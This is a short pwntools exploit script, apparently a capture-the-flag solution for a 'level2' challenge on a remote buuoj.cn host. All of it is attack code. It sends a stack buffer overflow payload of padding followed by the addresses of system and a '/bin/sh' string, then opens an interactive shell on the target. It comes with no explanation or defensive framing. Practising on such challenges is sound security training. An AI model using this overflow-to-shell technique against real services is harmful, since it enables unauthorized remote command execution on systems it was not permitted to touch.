from pwn import *
context.log_level = 'debug'

binsh = 0x0804a024
callsys = 0x0804845c
system = 0x08048320

conn = remote(b'node4.buuoj.cn', 27978)

#conn = process('./level2')
#gdb.attach(conn, 'b scanf')
conn.recvuntil(b"Input:\n")

payload = b'a' * (0x88+0x4) + p32(system) + p32(0) + p32(binsh)
conn.sendline(payload)
#conn.recv()
conn.interactive()
